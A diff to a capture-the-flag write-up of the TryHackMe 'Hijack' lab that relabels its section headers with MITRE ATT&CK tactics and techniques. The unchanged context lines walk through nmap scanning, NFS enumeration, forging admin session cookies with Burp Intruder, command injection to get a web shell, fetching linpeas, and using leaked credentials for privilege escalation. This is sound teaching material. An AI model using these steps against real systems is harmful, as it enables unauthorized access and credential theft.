@@ -51,8 +51,8 @@ The `/administration.php` page presents the ability to execute arbitrary command
 There does not appear to be any known mitigation for the LD_LIBRARY_PATH vulnerability yet. The vulnerability has been assigned [CVE-2023-4911](https://nvd.nist.gov/vuln/detail/CVE-2023-4911). Purportedly some security technologies such as Falco can detect this behavior.
 
 # Attack: Sequence of Events
-## Reconnaissance:
-### Active Scanning: Scanning IP Blocks(T1595.001)
+## Tactic: Reconnaissance:
+### Technique: Active Scanning: Scanning IP Blocks(T1595.001)
 I began with active reconnaissance of the target by using Nmap:
 ```bash
 $ nmap -sV < TARGET IP >
@@ -81,7 +81,7 @@ ftp: Login failed
 ```
 
 ### HTTP (80)
-#### Search Victim-Owned Websites(T1594)
+#### Technique: Search Victim-Owned Websites(T1594)
 I began testing the HTTP service by performing a simple walkthrough of the web application. At `/signup.php` I attempted to create a user named "admin" and was informed "This username is already taken." 
 
 I navigated to the login page and attempted logging in with username "test" and password "test." This resulted in an error message: "The username and password are not valid." I then changed the username to "admin" and the error changed to: "The password you entered is not valid."
@@ -95,8 +95,8 @@ This proved to be unsuccessful as the login form implements a lockout after too 
 
 I also clicked the link to `/administration.php` but received the error message: Access denied.
 
-## Collection, Credential Access, Resource Development
-### Data from Network Shared Drive(T1039), Unsecured Credentials: Credentials In Files(T1552.001)
+## Tactics: Collection, Credential Access, Resource Development
+### Techniques: Data from Network Shared Drive(T1039), Unsecured Credentials: Credentials In Files(T1552.001)
 #### rpcbind/nfs(111, 2049)
 I performed an additional scan with Nmap against the rpcbind service on port 111:
 ```bash
@@ -195,7 +195,7 @@ NOTE To rick : good job on limiting login attempts, it works like a charm, this 
 ```
 I used `less` to view the contents of `.passwords_list.txt` and copied the list from the terminal to a new local file I created called `passwords_list.txt`. Along with the password list, this also enumerates another potential username: rick.
 
-### Obtain Capabilities: Vulnerabilities(T1588.006), Develop Capabilities: Exploits(T1587.004)
+### Techniques: Obtain Capabilities: Vulnerabilities(T1588.006), Develop Capabilities: Exploits(T1587.004)
 I turned back to the web service, and checked to see if the username "rick" was already taken. The username was not taken, so I went ahead and finished creating this account, with the password: password. I logged in as rick and caught the request and response with Burp Suite's intercept.
 
 I noticed that the request contained the following cookie value: `PHPSESSID=cmljazo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OQ` 
@@ -232,15 +232,15 @@ with open("hashedpasswords.txt", mode="r", encoding="utf-8") as f:
 ```
 I copied the output to a new file called `payloads.txt`.
 
-### Forge Web Credentials: Web Cookies(T1606.001)
+### Technique: Forge Web Credentials: Web Cookies(T1606.001)
 In order to gain access to the administrator page I used Burp Suite. First, I signed in as "rick" again, and attempted to access `/administration.php`. I caught the request with intercept and sent it to intruder. Then I turned the PHPSESSID value into the payload variable. For the payload options, I added `payloads.txt` as a simple list, and turned on grep match for the string "Access denied."
 
 I ran the payload and found the result which did not grep match the defined string: `YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU`
 
 I then went back to intercept, pasted in the admin user's `PHPSESSID` and clicked forward. I was now able view `/administration.php`
 
-## Initial Access
-### Exploit Public-Facing Application(T1190)
+## Tactic: Initial Access
+### Technique: Exploit Public-Facing Application(T1190)
 The page at `/administration.php` features a "Service Status Checker" which consists of a text box and a "submit" button. I first tested its functionality by entering "ftp", which returned:
 ```bash
 * ftp.service
@@ -303,8 +303,8 @@ www-data@Hijack:/var/www/html$ whoami
 whoami
 www-data
 ```
-## Resource Development, Credential Access
-### Obtain Capabilities: Tool(T1588.002)
+## Tactics: Resource Development, Credential Access
+### Technique: Obtain Capabilities: Tool(T1588.002)
 Next I turned to a familiar tool to explore potential avenues for privilege escalation, linPEAS. I already have `linpeas.sh` on my local machine, so I navigated to its directory and started an HTTP server with Python on port 8888:
 ```bash
 $ python3 -m http.server 8888
@@ -333,7 +333,7 @@ chmod +x linpeas.sh
 www-data@Hijack:/tmp$ ./linpeas.sh
 ```
 
-### Unsecured Credentials: Credentials In Files(T1552.001)
+### Technique: Unsecured Credentials: Credentials In Files(T1552.001)
 After the script finished, I found the following interesting results:
 ```bash
 ╔══════════╣ Searching passwords in config PHP files
@@ -361,8 +361,8 @@ if ($mysqli->connect_error) {
 ```
 Once again, unsecured credentials have been found in a file.
 
-## Privilege Escalation, Persistence
-### Valid Accounts: Local Accounts(T1078.003)
+## Tactics: Privilege Escalation, Persistence
+### Technique: Valid Accounts: Local Accounts(T1078.003)
 Next, I confirmed the validity of these credentials and the privilege escalation:
 ```bash
 www-data@Hijack:/tmp$ su rick
@@ -380,7 +380,7 @@ cat user.txt
 THM{REDACTED}
 ```
 
-### Hijack Execution Flow: Dynamic Linker Hijacking(T1574.006), Hijack Execution Flow: Path Interception by PATH Environment Variable(T1574.007)
+### Techniques: Hijack Execution Flow: Dynamic Linker Hijacking(T1574.006), Hijack Execution Flow: Path Interception by PATH Environment Variable(T1574.007)
 For privelege escalation to root, I began by running the following command to check for rick's sudo privileges:
 ```bash
 rick@Hijack:~$ sudo -l
